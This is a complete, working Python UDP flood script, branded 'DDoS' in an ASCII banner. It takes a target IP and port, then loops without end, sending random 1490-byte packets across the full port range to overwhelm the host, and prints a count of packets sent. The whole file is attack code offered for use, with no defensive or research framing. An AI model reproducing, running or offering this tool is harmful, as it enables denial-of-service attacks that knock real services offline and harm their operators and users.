#!/usr/bin/env python3
# Author: @haithamaouati
# Version:1.0

import argparse
import colorama
import os
import time
import socket
import random

from colorama import Fore, Back, Style
colorama.init()

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system('cls' if os.name == 'nt' else 'clear')

print('''\

                            ,--.!,
   ___  ___       ____   __/   -*-
  / _ \/ _ \___  / __/ ,d08b.  '|`
 / // / // / _ \_\ \   0088MM     
/____/____/\___/___/   `9MMP'     
                       
''')

print('Author: ' + Fore.CYAN + '@haithamaouati' + Fore.WHITE + ' Version: ' + Fore.YELLOW + '1.0\n' + Fore.WHITE)

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--ip', metavar='ip', type=str, help='Input the ip address')
parser.add_argument('-p', '--port', metavar='port', type=str, help='Input the port')

args = parser.parse_args()

if args.ip == None or args.port == None:
    parser.print_help()
    exit();
ip = args.ip
port = int(args.port)

time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(Fore.GREEN + ' [*]' + Fore.WHITE + ' Sent %s packet to %s throught port:%s'%(sent,ip,port))
     if port == 65534:
       port = 1